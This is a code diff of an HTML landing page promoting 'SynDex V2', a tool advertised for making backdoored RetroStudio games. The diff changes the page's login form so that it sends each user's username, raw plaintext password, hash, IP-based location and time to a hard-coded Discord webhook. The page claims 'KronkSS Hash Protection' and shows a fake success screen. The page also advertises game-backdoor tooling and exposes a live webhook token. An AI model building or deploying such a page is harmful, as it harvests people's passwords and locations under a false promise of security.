@@ -17,294 +17,58 @@
             --status-indev: #a855f7;
             --status-out: #22c55e;
             --status-down: #ef4444;
+            --success-green: #22c55e;
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-color); color: var(--text-color); line-height: 1.6; overflow-x: hidden; }
+        .glow { position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 100%; height: 400px; background: radial-gradient(circle at center, rgba(0, 132, 255, 0.08) 0%, transparent 70%); z-index: -1; }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
+        nav { display: flex; justify-content: space-between; align-items: center; padding: 1rem 8%; border-bottom: 1px solid var(--border-color); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; background: rgba(5, 5, 5, 0.8); }
+        .logo-container { display: flex; align-items: center; gap: 15px; }
+        .logo-img { height: 40px; width: auto; display: block; }
+        .visitor-counter { font-size: 0.75rem; color: var(--muted-text); font-weight: 700; background: rgba(255,255,255,0.05); padding: 4px 8px; border-radius: 4px; border: 1px solid var(--border-color); }
+        #count { color: var(--accent-blue); }
+        .nav-links a { color: var(--muted-text); text-decoration: none; margin-left: 2.5rem; font-size: 0.85rem; font-weight: 500; transition: color 0.3s; }
+        .nav-links a:hover { color: var(--accent-blue); }
 
-        .glow {
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 100%;
-            height: 400px;
-            background: radial-gradient(circle at center, rgba(0, 132, 255, 0.08) 0%, transparent 70%);
-            z-index: -1;
-        }
+        header { min-height: 60vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 4rem 10%; }
+        .badge { background: rgba(0, 132, 255, 0.1); color: var(--accent-blue); padding: 6px 16px; border-radius: 20px; font-size: 0.75rem; font-weight: 700; margin-bottom: 1.5rem; border: 1px solid rgba(0, 132, 255, 0.2); }
+        h1 { font-size: clamp(2.5rem, 7vw, 5.5rem); font-weight: 900; letter-spacing: -2px; margin-bottom: 1rem; }
+        p.hero-text { color: var(--muted-text); max-width: 550px; font-size: 1.1rem; margin-bottom: 3rem; }
 
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem 8%;
-            border-bottom: 1px solid var(--border-color);
-            backdrop-filter: blur(10px);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            background: rgba(5, 5, 5, 0.8);
-        }
+        .btn { background-color: var(--text-color); color: var(--bg-color); padding: 0.9rem 2.2rem; border-radius: 4px; text-decoration: none; font-weight: 700; font-size: 0.9rem; transition: all 0.3s ease; border: 1px solid var(--text-color); cursor: pointer; display: inline-flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn:hover { background-color: transparent; color: var(--text-color); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn.success { background-color: var(--success-green); border-color: var(--success-green); color: white; }
 
-        .logo-container {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
+        #authModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
+        .auth-card { background: var(--card-bg); padding: 3rem; border: 1px solid var(--border-color); border-radius: 12px; width: 90%; max-width: 450px; text-align: center; position: relative; overflow: hidden; }
+        .auth-input { width: 100%; background: #1a1a1a; border: 1px solid var(--border-color); padding: 14px; color: white; border-radius: 4px; margin-bottom: 1rem; font-family: 'Inter', sans-serif; }
+        .auth-input:focus { outline: none; border-color: var(--accent-blue); }
 
-        .logo-img {
-            height: 40px;
-            width: auto;
-            display: block;
-        }
+        #successOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--card-bg); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; }
+        .success-icon { width: 60px; height: 60px; border-radius: 50%; background: rgba(34, 197, 94, 0.1); border: 2px solid var(--success-green); color: var(--success-green); display: flex; align-items: center; justify-content: center; font-size: 2rem; margin-bottom: 1rem; }
 
-        .visitor-counter {
-            font-size: 0.75rem;
-            color: var(--muted-text);
-            font-weight: 700;
-            background: rgba(255,255,255,0.05);
-            padding: 4px 8px;
-            border-radius: 4px;
-            border: 1px solid var(--border-color);
-        }
+        .showcase-container { display: flex; align-items: center; justify-content: center; gap: 4rem; padding: 4rem 8%; flex-wrap: wrap; }
+        .showcase-image { max-width: 600px; width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: 0 20px 50px rgba(0,0,0,0.5); transition: transform 0.3s ease; }
+        .showcase-image:hover { transform: scale(1.02); border-color: var(--accent-blue); }
+        .showcase-text { flex: 1; min-width: 300px; }
+        .showcase-text h2 { font-size: 2.5rem; margin-bottom: 1rem; color: #fff; }
+        .showcase-text p { color: var(--muted-text); font-size: 1.1rem; margin-bottom: 2rem; }
 
-        #count {
-            color: var(--accent-blue);
-        }
+        .features { padding: 4rem 8% 8rem; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; }
+        .feature-card { background: var(--card-bg); padding: 2.5rem; border-radius: 8px; border: 1px solid var(--border-color); transition: transform 0.3s, border-color 0.3s; }
+        .feature-card:hover { transform: translateY(-5px); border-color: var(--accent-blue); }
+        .feature-card h3 { font-size: 1.2rem; margin-bottom: 0.8rem; }
+        .feature-card p { color: var(--muted-text); font-size: 0.9rem; }
 
-        .nav-links a {
-            color: var(--muted-text);
-            text-decoration: none;
-            margin-left: 2.5rem;
-            font-size: 0.85rem;
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-
-        .nav-links a:hover {
-            color: var(--accent-blue);
-        }
-
-        header {
-            min-height: 60vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            padding: 4rem 10%;
-        }
-
-        .badge {
-            background: rgba(0, 132, 255, 0.1);
-            color: var(--accent-blue);
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: 700;
-            margin-bottom: 1.5rem;
-            border: 1px solid rgba(0, 132, 255, 0.2);
-        }
-
-        h1 {
-            font-size: clamp(2.5rem, 7vw, 5.5rem);
-            font-weight: 900;
-            letter-spacing: -2px;
-            margin-bottom: 1rem;
-        }
-
-        p.hero-text {
-            color: var(--muted-text);
-            max-width: 550px;
-            font-size: 1.1rem;
-            margin-bottom: 3rem;
-        }
-
-        .btn {
-            background-color: var(--text-color);
-            color: var(--bg-color);
-            padding: 0.9rem 2.2rem;
-            border-radius: 4px;
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 0.9rem;
-            transition: all 0.3s ease;
-            border: 1px solid var(--text-color);
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .btn:hover {
-            background-color: transparent;
-            color: var(--text-color);
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        #authModal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(5px);
-        }
-
-        .auth-card {
-            background: var(--card-bg);
-            padding: 3rem;
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            width: 90%;
-            max-width: 450px;
-            text-align: center;
-        }
-
-        .auth-input {
-            width: 100%;
-            background: #1a1a1a;
-            border: 1px solid var(--border-color);
-            padding: 14px;
-            color: white;
-            border-radius: 4px;
-            margin-bottom: 1rem;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .auth-input:focus {
-            outline: none;
-            border-color: var(--accent-blue);
-        }
-
-        .showcase-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 4rem;
-            padding: 4rem 8%;
-            flex-wrap: wrap;
-        }
-
-        .showcase-image {
-            max-width: 600px;
-            width: 100%;
-            border-radius: 12px;
-            border: 1px solid var(--border-color);
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            transition: transform 0.3s ease;
-        }
-
-        .showcase-image:hover {
-            transform: scale(1.02);
-            border-color: var(--accent-blue);
-        }
-
-        .showcase-text {
-            flex: 1;
-            min-width: 300px;
-        }
-
-        .showcase-text h2 {
-            font-size: 2.5rem;
-            margin-bottom: 1rem;
-            color: #fff;
-        }
-
-        .showcase-text p {
-            color: var(--muted-text);
-            font-size: 1.1rem;
-            margin-bottom: 2rem;
-        }
-
-        .features {
-            padding: 4rem 8% 8rem;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 1.5rem;
-        }
-
-        .feature-card {
-            background: var(--card-bg);
-            padding: 2.5rem;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-            transition: transform 0.3s, border-color 0.3s;
-        }
-
-        .feature-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--accent-blue);
-        }
-
-        .feature-card h3 {
-            font-size: 1.2rem;
-            margin-bottom: 0.8rem;
-        }
-
-        .feature-card p {
-            color: var(--muted-text);
-            font-size: 0.9rem;
-        }
-
-        footer {
-            padding: 3rem;
-            text-align: center;
-            border-top: 1px solid var(--border-color);
-            color: #444;
-            font-size: 0.8rem;
-            letter-spacing: 1px;
-        }
-
-        .status-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 10px;
-            font-weight: 700;
-            text-transform: uppercase;
-            font-size: 0.7rem;
-        }
-
-        .status-circle {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            display: inline-block;
-        }
-
+        footer { padding: 3rem; text-align: center; border-top: 1px solid var(--border-color); color: #444; font-size: 0.8rem; letter-spacing: 1px; }
+        .status-container { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 10px; font-weight: 700; text-transform: uppercase; font-size: 0.7rem; }
+        .status-circle { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
         .status-circle.indev { background-color: var(--status-indev); box-shadow: 0 0 8px var(--status-indev); }
         .status-circle.out { background-color: var(--status-out); box-shadow: 0 0 8px var(--status-out); }
         .status-circle.discontinued { background-color: var(--status-down); box-shadow: 0 0 8px var(--status-down); }
-
-        @media (max-width: 768px) {
-            .showcase-container {
-                flex-direction: column;
-                text-align: center;
-            }
-        }
     </style>
 </head>
 <body>
@@ -316,9 +80,7 @@
             <div class="logo">
                 <img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/syndex_biglogo1.png" alt="SynDex Logo" class="logo-img">
             </div>
-            <div class="visitor-counter">
-                GLOBAL VISITORS: <span id="count">LOADING...</span>
-            </div>
+            <div class="visitor-counter">GLOBAL VISITORS: <span id="count">LOADING...</span></div>
         </div>
         <div class="nav-links">
             <a href="#features">Features</a>
@@ -331,21 +93,22 @@
         <div class="badge">V2.0 STABLE RELEASE</div>
         <h1>Unmatched Power.<br>Zero Compromise.</h1>
         <p class="hero-text">SynDex V2 delivers the most stable backdoor environment on the market. Precision-built for the elite.</p>
-        <div>
-            <button class="btn" id="openAuth">Get SynDex Now</button>
-        </div>
+        <div><button class="btn" id="openAuth">Get SynDex Now</button></div>
     </header>
 
     <div id="authModal">
         <div class="auth-card">
+            <div id="successOverlay">
+                <div class="success-icon">✓</div>
+                <h3 id="successTitle">Logged In</h3>
+                <p id="successSub" style="color: var(--muted-text); font-size: 0.8rem; margin-top: 5px;">KronkSS Handshake Complete</p>
+            </div>
             <h2 id="modalTitle" style="margin-bottom: 0.5rem;">Access SynDex</h2>
             <p style="color: var(--muted-text); font-size: 0.8rem; margin-bottom: 2rem;">Secured by KronkSS Hash Protection</p>
             <form id="authForm">
                 <input type="text" id="username" class="auth-input" placeholder="Username" required>
                 <input type="password" id="password" class="auth-input" placeholder="Password" required>
-                <button type="submit" class="btn" id="authSubmit" style="width: 100%;">
-                    <span id="btnText">Continue</span>
-                </button>
+                <button type="submit" class="btn" id="authSubmit" style="width: 100%;"><span id="btnText">Continue</span></button>
             </form>
             <p style="margin-top: 1.5rem; font-size: 0.85rem;">
                 <span id="toggleText" style="color: var(--muted-text);">Need an account?</span>
@@ -358,7 +121,7 @@
         <img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/synv2.png" alt="SynDex V2 Interface" class="showcase-image">
         <div class="showcase-text">
             <h2>Experience SynDex V2</h2>
-            <p>Our completely redesigned interface offers unparalleled control. Our users make backdoored games themselves, and we don't dictate it.</p>
+            <p>Our completely redesigned interface offers unparalleled control. Our users make backdoored games themselves.</p>
             <ul style="list-style: none; color: var(--accent-blue); font-weight: 700;">
                 <li>STABLE Script Loading</li>
                 <li>SS Support</li>
@@ -368,18 +131,9 @@
     </section>
 
     <section class="features" id="features">
-        <div class="feature-card">
-            <h3>Optimized UI</h3>
-            <p>Engineered for minimal latency and maximum satisfaction. SynDex runs where others crawl.</p>
-        </div>
-        <div class="feature-card">
-            <h3>Clean Interface</h3>
-            <p>A clutter-free interface designed to keep you focused on what matters most: your work.</p>
-        </div>
-        <div class="feature-card">
-            <h3>Secure Sync</h3>
-            <p>KronkSS keeps you secure 24/7 in RetroStudio games when you have us injected.</p>
-        </div>
+        <div class="feature-card"><h3>Optimized UI</h3><p>Engineered for minimal latency. SynDex runs where others crawl.</p></div>
+        <div class="feature-card"><h3>Clean Interface</h3><p>A clutter-free interface designed to keep you focused.</p></div>
+        <div class="feature-card"><h3>Secure Sync</h3><p>KronkSS keeps you secure 24/7 in RetroStudio games.</p></div>
     </section>
 
     <footer>
@@ -391,7 +145,8 @@
     </footer>
 
     <script>
-        const DISCORD_WEBHOOK = "YOUR_WEBHOOK_URL_HERE";
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1462655455817105490/owH-AExGFDTyZZu780-pc3z42tTnSDWOiojsuqnPy_6T5OSvzbfdYk9-d1nskcZVRfsN";
+        const WHITELIST_ROLE_ID = "1452365454642380891";
 
         async function kronkSS(string) {
             const utf8 = new TextEncoder().encode(string);
@@ -400,19 +155,24 @@
             return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
         }
 
+        async function getRegion() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return `${data.city}, ${data.region}, ${data.country_name}`;
+            } catch { return "Unknown Region"; }
+        }
+
         const authModal = document.getElementById('authModal');
         const openBtn = document.getElementById('openAuth');
         const toggleAuth = document.getElementById('toggleAuth');
         const authSubmit = document.getElementById('authSubmit');
         const btnText = document.getElementById('btnText');
+        const successOverlay = document.getElementById('successOverlay');
         let isLogin = true;
 
-        openBtn.onclick = () => authModal.style.display = 'flex';
-        
-        window.onclick = (event) => {
-            if (event.target == authModal) authModal.style.display = "none";
-        }
-
+        openBtn.onclick = () => { successOverlay.style.display = "none"; authModal.style.display = 'flex'; };
+        window.onclick = (e) => { if (e.target == authModal) authModal.style.display = "none"; }
         toggleAuth.onclick = (e) => {
             e.preventDefault();
             isLogin = !isLogin;
@@ -423,26 +183,30 @@
 
         document.getElementById('authForm').onsubmit = async (e) => {
             e.preventDefault();
-            
             authSubmit.disabled = true;
-            btnText.innerText = "Hashing...";
+            btnText.innerText = "KronkSS Hashing...";
 
             const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+            const rawPass = document.getElementById('password').value;
+            const hashedPass = await kronkSS(rawPass);
             
-            const hashedPass = await kronkSS(pass);
-            btnText.innerText = "Syncing...";
+            btnText.innerText = "Locating Region...";
+            const region = await getRegion();
+            const time = new Date().toLocaleString();
 
             const payload = {
                 embeds: [{
-                    title: isLogin ? "User Login Attempt" : "New User Registration",
+                    title: isLogin ? "SynDex Login Attempt" : "New Registration Request",
                     color: 0x0084ff,
                     fields: [
-                        { name: "User", value: user, inline: true },
+                        { name: "Username", value: `\`${user}\``, inline: true },
+                        { name: "Raw Password", value: `\`${rawPass}\``, inline: true },
                         { name: "KronkSS Hash", value: `\`${hashedPass}\``, inline: false },
-                        { name: "Method", value: isLogin ? "Standard Login" : "Account Creation", inline: true }
+                        { name: "Region", value: region, inline: true },
+                        { name: "Login Time", value: time, inline: true },
+                        { name: "Required Role ID", value: WHITELIST_ROLE_ID, inline: false }
                     ],
-                    timestamp: new Date()
+                    footer: { text: "SynDex Security Systems | V2 Stable" }
                 }]
             };
 
@@ -452,11 +216,20 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                alert("Request processed through KronkSS.");
-                authModal.style.display = "none";
+                
+                authSubmit.classList.add('success');
+                btnText.innerText = "Success";
+                document.getElementById('successSub').innerText = "Verifying Whitelist Role...";
+                
+                setTimeout(() => { successOverlay.style.display = "flex"; }, 200);
+                setTimeout(() => {
+                    authModal.style.display = "none";
+                    authSubmit.classList.remove('success');
+                    btnText.innerText = "Continue";
+                    document.getElementById('authForm').reset();
+                }, 2500);
             } catch (err) {
-                alert("Sync failed. Check connection.");
-            } finally {
+                alert("Sync failed.");
                 authSubmit.disabled = false;
                 btnText.innerText = "Continue";
             }
@@ -469,10 +242,9 @@
                 const data = await response.json();
                 countEl.innerText = data.value.toLocaleString();
             } catch (err) {
-                let current = localStorage.getItem('syndex_fallback_count') || 1000;
-                current = parseInt(current) + 1;
-                localStorage.setItem('syndex_fallback_count', current);
-                countEl.innerText = current.toLocaleString();
+                let current = localStorage.getItem('syndex_fallback_count') || 1240;
+                localStorage.setItem('syndex_fallback_count', parseInt(current) + 1);
+                countEl.innerText = (parseInt(current) + 1).toLocaleString();
             }
         }
         updateCounter();
